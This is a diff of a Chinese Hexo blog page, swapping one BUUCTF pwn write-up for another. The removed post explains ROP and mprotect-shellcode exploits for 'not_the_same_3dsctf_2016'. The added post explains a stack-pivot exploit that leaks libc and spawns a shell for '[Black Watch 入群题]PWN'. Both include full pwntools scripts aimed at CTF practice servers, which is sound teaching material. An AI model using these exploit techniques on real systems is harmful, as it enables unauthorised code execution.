@@ -17,21 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>buuctf-not_the_same_3dsctf_2016 | solo</title>
-  <meta name="description" content="not_the_same_3dsctf_2016看保护 12345Arch:     i386-32-littleRELRO:    Partial RELRO				&#x2F;&#x2F;没开Stack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  我们看向伪代码 12345678int __cd">
+  <title>buuctf-[Black Watch 入群题]PWN | solo</title>
+  <meta name="description" content="spwn查看保护 123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;4&#x2F;spwn&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found			&#x2F;&#x2F;没开    NX:       NX enabled    PIE:      No PI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf-not_the_same_3dsctf_2016">
-<meta property="og:url" content="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/index.html">
+<meta property="og:title" content="buuctf-[Black Watch 入群题]PWN">
+<meta property="og:url" content="http://example.com/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="not_the_same_3dsctf_2016看保护 12345Arch:     i386-32-littleRELRO:    Partial RELRO				&#x2F;&#x2F;没开Stack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  我们看向伪代码 12345678int __cd">
+<meta property="og:description" content="spwn查看保护 123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;4&#x2F;spwn&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found			&#x2F;&#x2F;没开    NX:       NX enabled    PIE:      No PI">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-01-16T13:01:06.000Z">
-<meta property="article:modified_time" content="2022-01-16T13:01:47.369Z">
+<meta property="article:published_time" content="2022-03-16T12:07:28.000Z">
+<meta property="article:modified_time" content="2022-03-16T12:08:40.464Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="buuctf-pwn">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/index.html">
+  <link rel="canonical" href="http://example.com/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -341,14 +341,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-buuctf-not-the-same-3dsctf-2016" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-buuctf-Black-Watch-入群题-PWN" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      buuctf-not_the_same_3dsctf_2016
+      buuctf-[Black Watch 入群题]PWN
     </h1>
   
 
@@ -356,8 +356,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2022/01/16/buuctf-not-the-same-3dsctf-2016/" class="article-date">
-	  <time datetime="2022-01-16T13:01:06.000Z" itemprop="datePublished">2022-01-16</time>
+	<a href="/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/" class="article-date">
+	  <time datetime="2022-03-16T12:07:28.000Z" itemprop="datePublished">2022-03-16</time>
 	</a>
 </span>
         
@@ -370,38 +370,35 @@
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/01/16/buuctf-not-the-same-3dsctf-2016/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>看保护</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO				//没开</span><br><span class="line">Stack:    No canary found			//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)		//没开</span><br></pre></td></tr></table></figure>
+        <h1 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h1><p>查看保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/4/spwn&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found			<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span>		<span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure>
 
-<p>我们看向伪代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-2Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(&amp;v4);		<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行一下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./spwn </span><br><span class="line">Hello good Ctfer!</span><br><span class="line">What is your name?aaaaaa</span><br><span class="line">What <span class="keyword">do</span> you want to say?aaaaa</span><br><span class="line">GoodBye!</span><br></pre></td></tr></table></figure>
 
-<p>我们找/bin/sh等字符串发现没有其中的字符串,但是搜索flag，有一个flag.txt,找到一个函数为get_secret()函数</p>
-<p>get_secret()函数如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我看题目类型肯定是有溢出的.要不就是栈迁移.</p>
+<p>查看伪代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vul_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);		<span class="comment">//可以在s中写入很大值</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);		<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p> fgets函数是读取一句字符串,读取到fl4g中fl4g的bss段</p>
-<p>这个时候可以正常rop用write读出来</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"><span class="comment">#io=process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eca2d</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(<span class="number">0x80489a0</span>)+p32(elf.sym[<span class="string">&#x27;write&#x27;</span>])+p32(bss)+p32(<span class="number">1</span>)+p32(bss)+p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>标准的栈迁移,你看只能在s中输入很大的值,但是没办法溢出的,只有在buf那里可以溢出8个字节只够我们溢出到ret，那我们只能构建到到是s，来构造我们自己的system(‘/bin/sh’),所以我们需要先去泄漏libc.</p>
+<p>需要打印出write的真实地址查出，并且让函数再次返回主函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;aaaa&quot; + p32(write_plt) + p32(main_addr)+p32(1) + p32(write_got) + p32(4)</span><br></pre></td></tr></table></figure>
 
+<p>主要的是你第一次泄漏的地址是write的真实的地址,然后计算libc地址,第二次溢出,我将溢出的值迁移到第一次的栈上,来达到getshell的地步,所以要构造第一个的栈要getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26368)</span><br><span class="line">#p=process(&#x27;./spwn&#x27;)</span><br><span class="line">elf = ELF(&quot;spwn&quot;)</span><br><span class="line"></span><br><span class="line">bss_s = 0x0804A300				#将fake栈迁移到bss中</span><br><span class="line">leave_ret = 0x08048511			#栈迁移所需要的的地址</span><br><span class="line">write_plt = elf.plt[&quot;write&quot;]	#plt表可以调用write函数</span><br><span class="line">write_got = elf.got[&quot;write&quot;]	#got表里有write函数的真实地址</span><br><span class="line">main_addr = elf.sym[&quot;main&quot;]	#控制函数执行流需要再次回到主函数</span><br><span class="line"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br><span class="line">payload = b&quot;aaaa&quot; + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(1) + p32(write_got) + p32(4)</span><br><span class="line">p.sendafter(&quot;name?&quot;, payload)#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br><span class="line"># 上面将一些执行流程写入了bss段</span><br><span class="line"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br><span class="line">payload = b&quot;a&quot; * 0x18 #这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(&quot;say?&quot;, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(4)) #接收泄露的地址</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23-32.so&quot;)</span><br><span class="line">libc_base = write_addr - libc.sym[&quot;write&quot;]#获取libc的基地址</span><br><span class="line">system_addr = libc_base + libc.sym[&quot;system&quot;]#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span><br><span class="line">binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span><br><span class="line"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="line"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br><span class="line">payload = b&quot;aaaa&quot; + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(&quot;name?&quot;, payload)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot; * 0x18 + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(&quot;say?&quot;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-<p>之后看他们的博客有第2种办法这个办法,是我没有涉及到的思路,我们看向wp吧,来解析</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>他这里是用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell</p>
-<p>首先<code>0x2d</code>是main函数中栈空间的大小，它的下一个位置就是ret指令对应的返回地址了</p>
-<p>p32(mprotect)就是mprotect函数的地址，接下来的p32(pop)是为了保持栈平衡而将后面压入的三个参数从栈上弹出，弹出后我们并不使用它，就是为了控制栈的结构，p32(pop)的位置也同样是执行完mprotect后的返回地址，pop对应的指令为 pop esi ; pop ebx ; pop edx ; ret，最后ret就跳转到p32(read_addr)这里了</p>
-<p>同理，<code>p32(read_addr)</code>的下一个<code>p32(addr)</code>也是执行完read函数后跳转的地址，后面是read的三个参数</p>
-<p>整个思路就是，利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置，就成功拿到shell了</p>
-<p>小结:</p>
-<p>好像也是可以用printf输出flag</p>
+<p>小节:</p>
+<p>leave相当于    </p>
+<p>mov esp,ebp;</p>
+<p>pop ebp;</p>
+<p>ret相当于</p>
+<p>pop eip;</p>
 
       
     </div>
@@ -411,7 +408,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/" title="buuctf-not_the_same_3dsctf_2016" target="_blank" rel="external">http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/</a>
+      <a href="http://example.com/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/" title="buuctf-[Black Watch 入群题]PWN" target="_blank" rel="external">http://example.com/2022/03/16/buuctf-Black-Watch-入群题-PWN/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -457,13 +454,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/" title="buuctf-[HarekazeCTF2019]baby_rop"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2022/01/16/buuctf-ciscn-2019-en-2/" title="buuctf-ciscn_2019_en_2"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2022/03/14/buuctf-jarvisoj-level3/" title="buuctf-jarvisoj_level3"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
